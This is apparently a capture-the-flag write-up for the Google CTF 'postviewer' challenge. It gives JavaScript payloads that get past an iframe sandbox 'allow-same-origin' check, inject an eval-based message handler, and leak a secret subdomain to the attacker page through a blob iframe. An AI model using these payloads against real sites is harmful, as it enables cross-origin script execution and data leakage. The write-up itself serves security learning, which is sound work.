Google CTF postviewer all versions

2025-07-02

Postviewer 2023⌗

Assume, attacker’s page: http://hritik.sh iframe shim page: http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh

ifr1 = document.createElement('iframe')
ifr1.src = 'http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh'
document.body.appendChild(ifr1)

Bypass allow-same-origin regex check (/g) and create an iframe:

ifr1.contentWindow.postMessage({'body': '<iframe name="ifr2" id="ifr2"></iframe><script> onmessage= (e) => {console.log(eval(e.data))}</script>', 'mimeType':'text/html', 'sandbox': ['allow-same-origin', 'allow-same-origin', 'allow-scripts']}, "*")

Create a blob iframe inside of this iframe (parent CSP allows blob only and CSP propagates in local schemes, see: w3org). This iframe will have access to location.ancestorOrigins and thus leak the random sub-domain (aeu). This is why allow-same-origin bypass was required, otherwise origin is set to null in sandbox.

top[0][0].postMessage("blob = new Blob(['<script>top.postMessage(window.location.ancestorOrigins[0], \"*\")</script>'], {type: 'text/html'}); document.getElementById('ifr2').src=URL.createObjectURL(blob)", "*")

In the top redirection section terjanq says (1) as well could be a Chrome bug because of the comment that says that the ancestor chain should be respected.

// Top navigation is forbidden in sandboxed frames unless opted-in, and only // then if the ancestor chain allowed to navigate the top frame. // Note: We don’t check root fenced frames for kTop* flags since the kTop* // flags imply the actual top-level page.

Although, it is NOT a chrome bug as ancestor chain is respected. Here, the top frame is allowed to navigate the iframe because it does not have sandbox set at all.
